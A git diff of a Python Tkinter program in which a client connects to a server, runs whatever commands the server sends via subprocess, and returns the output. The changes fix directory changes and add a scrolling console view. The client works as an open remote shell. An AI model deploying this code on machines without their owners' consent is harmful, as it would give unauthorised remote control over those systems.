@@ -36,8 +36,8 @@ class Server():
                 self.client, self.addr = self.server_socket.accept()
                 print(f"connected {self.addr[0]}, {self.addr[1]}")
 
-                client_system_info = self.client.recv(1024).decode()
-                print(client_system_info)
+                self.client_username = self.client.recv(1024).decode()
+                print(self.client_username)
 
                 self.server_listen_accept_bool = False
                 self.recv_out_put_thread.start()
@@ -50,9 +50,19 @@ class Server():
         
         
 
-    def send_command(self, cmnd):
+    def send_command(self):
+        self.cmnd = run_login.run_server.command_entry.get()
+        run_login.run_server.command_entry.delete(0, tk.END)
         if self.connected == True:
-            self.client.send(cmnd.encode())
+            if self.cmnd != "":
+                if self.cmnd == "clear" or self.cmnd == "cls":
+                    run_login.run_server.output_list.clear()
+                    destroy_old_frames(run_login.run_server.inner_frame)
+                    run_login.run_server.print_output()
+                else:
+                    run_login.run_server.output_list.append("------------------------------------------------------------------------------------------------------------------------")
+                    run_login.run_server.output_list.append(f'{self.client_username}:> {self.cmnd}')
+                    self.client.send(self.cmnd.encode())
         else:
             print("NOT connected!")
         
@@ -60,8 +70,10 @@ class Server():
     def recv_out_put(self):
         while self.connected and self.recv_out_put_bool:
             self.output = self.client.recv(1024).decode()
-            run_login.run_server.print_output_label.config(text=self.output)
-
+            run_login.run_server.output_list.append(self.output)
+            destroy_old_frames(run_login.run_server.inner_frame)
+            run_login.run_server.print_output()
+            
 
     def voice_socket():
         pass
@@ -108,18 +120,16 @@ class Client():
 
     def get_send_command(self):
         while self.connected and self.stop_get_send_command_loop:
-            self.command = self.client_socket.recv(1024)
-
+            self.command = self.client_socket.recv(1024).decode()
             if self.command == "exit":
-                exit()
-            elif self.command[:2] == "cd":
-                os.chdir(self.command[:2])
+                exit_program()
+            elif self.command[0:3] == "cd ":
+                os.chdir(self.command[3:])
                 self.client_socket.send(os.getcwd().encode())
             else:
-
-                self.output = subprocess.getoutput(self.command.decode())
+                self.output = subprocess.getoutput(self.command)
                 if self.output == "" or self.output == None:
-                    self.output = "Error"
+                    self.output = "\n"
                     self.client_socket.send(self.output.encode())
                 else:
                     self.client_socket.send(self.output.encode())
@@ -295,8 +305,17 @@ class Server_frame():
         self.listening_thread = threading.Thread(target=run_login.server.server_listen_accept, args=(self.server_ip, self.server_port))
         self.listening_thread.start()
 
-
-
+    def print_output(self):
+        for i in self.output_list:
+            self.print_output_label = tk.Label(self.inner_frame,
+                                        text=i,
+                                        font=('Arial', 20),
+                                        fg='green',
+                                        bg='black',
+                                        anchor='nw',
+                                        justify='left'
+                                        )
+            self.print_output_label.pack(fill='both', expand=True)
 
     # Pages
 
@@ -354,24 +373,43 @@ class Server_frame():
         self.indicate(self.command_btn)
         self.out_put_frame = tk.Frame(self.main_frame)
 
-        self.out_put_frame.place(x=50, y=50)
-        self.out_put_frame.pack_propagate(False)
-        self.out_put_frame.configure(width=860, height=670, background='black')
-
-        # self.scrollbar = tk.Scrollbar(self.out_put_frame)
-
         self.output_label = tk.Label(self.main_frame,
                                      text="Output:",
                                      font=('Arial', 15)
                                      )
-        self.print_output_label = tk.Label(self.out_put_frame,
-                                     text="Thid is command Line",
-                                     font=('Arial', 20),
-                                     fg='green',
-                                     bg='black',
-                                     anchor='nw',
-                                     justify='left'
-                                     )
+        self.output_label.place(x=50, y=20)
+        
+        # -------------------- scrollbar canvas --------------------
+        self.out_put_frame.place(x=50, y=50)
+        self.out_put_frame.pack_propagate(False)
+        self.out_put_frame.configure(width=860, height=670, background='black')
+
+        self.canvas = tk.Canvas(self.out_put_frame, background='black')
+        self.canvas.pack(fill="both", expand=True)
+
+        self.y_scrollbar = tk.Scrollbar(self.out_put_frame, orient='vertical', command=self.canvas.yview, width=15)
+        self.y_scrollbar.pack(side='right', fill='y')
+        self.x_scrollbar = tk.Scrollbar(self.out_put_frame, orient='horizontal', command=self.canvas.xview, width=15)
+        self.x_scrollbar.pack(side='bottom', fill='x')
+
+        self.canvas.configure(xscrollcommand=self.x_scrollbar.set, yscrollcommand=self.y_scrollbar.set)
+
+        self.inner_frame = tk.Frame(self.canvas, background='black')
+
+        self.output_list = []
+
+        self.canvas.create_window((0,0), window=self.inner_frame, anchor='nw')
+
+        def on_canvas_resize(event):
+            self.canvas.configure(scrollregion=self.canvas.bbox('all'))
+        self.canvas.bind("<Configure>", on_canvas_resize)
+
+        def on_inner_frame_resize(event):
+            self.canvas.itemconfigure(inner_frame_window, width=event.width)
+        self.inner_frame.bind("configure>", on_inner_frame_resize)
+        inner_frame_window = self.canvas.create_window((0,0), window=self.inner_frame, anchor='nw')
+        # ------------------------------------------------------------
+
         self.print_new_command_label = tk.Label(self.main_frame,
                                                 text='New Command:',
                                                 font=('Arial', 15)
@@ -382,21 +420,15 @@ class Server_frame():
                                       bg='black',
                                       width=57,
                                       )
-    
         self.send = tk.Button(self.main_frame,
                               text="Send",
-                              command= lambda: run_login.server.send_command(self.command_entry.get())
+                              command= lambda: run_login.server.send_command()
                               )
-        # self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
         
-        self.output_label.place(x=50, y=20)
-        self.print_output_label.pack(fill='both', expand=True)
         self.print_new_command_label.place(x=50, y=730)
         self.command_entry.place(x=50, y=760)
         self.send.place(x=450, y=825)
 
-        # self.out_put_frame.config(yscrollcommand=self.scrollbar.set)
-        # self.scrollbar.config(command=self.print_output_label.yview)
 
     def file_transfer_page(self):
         self.indicate(self.file_transfer_btn)
@@ -581,6 +613,9 @@ def destroy_old_frames(frame):
             frame.destroy()
         
 
+def exit_program():
+    root.destroy()
+    exit()
 
 
 root = tk.Tk()
@@ -590,7 +625,6 @@ root.title("Matin")
 
 # Runnig program 
 run_login = Login_frame(root)
-
 
 
 root.mainloop()
